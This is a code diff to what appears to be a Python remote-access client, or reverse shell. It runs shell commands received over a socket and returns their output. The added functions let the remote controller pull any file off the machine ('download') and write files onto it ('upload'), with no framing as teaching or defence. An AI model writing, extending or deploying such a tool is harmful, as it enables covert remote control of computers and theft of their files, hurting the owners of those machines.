@@ -42,6 +42,29 @@ def receive_Message(clientsocket: socket.socket):
             exit()
 
 
+# upload a file
+def upload_File(file_name, clientsocket):
+    try:
+        fd = open(file_name, "rb")
+        content = fd.read().decode()
+        send_Message(clientsocket, content)
+        fd.close()
+    except Exception as ex:
+        print(f"[-] File upload error {str(ex)}")
+        send_Message(clientsocket, str(ex))
+
+
+# download file
+def download_file(filename, clientsocket: socket.socket):
+    try:
+        filecontent = receive_Message(clientsocket)
+        fd = open(filename, "wb")
+        fd.write(filecontent.encode())
+        fd.close()
+    except Exception as ex:
+        print(f"[-] File upload error {str(ex)}")
+
+
 def main():
     if len(sys.argv) != 3:
         print("[+] Usage python ./server.py IP PORT")
@@ -58,6 +81,19 @@ def main():
             print(f"[+] COMMAND:~>{command}")
             if command == "quit":
                 exit()
+
+            # upload file when the server presses download
+            if command[0:8] == "download":
+                upload_File(command[9:], sock)
+                print("[+]Done Uploading..")
+                continue
+
+            if command[0:6] == "upload":
+                download_file(command[7:], sock)
+                print("[+]Done Downloading..")
+                continue
+
+            # change directory
             if command[0:3] == "cd ":
                 directory = command[3:].strip()
                 try:
@@ -71,6 +107,9 @@ def main():
             # EXECUTE THE COMMAND
             result = terminal.execute(command)
             send_Message(sock, result)
+    except socket.error as ex:
+        print(f"[-]SOcket Error :{str(ex)}")
+        exit()
     except Exception as ex:
         print(f"[-] Error :{str(ex)}")
         exit()
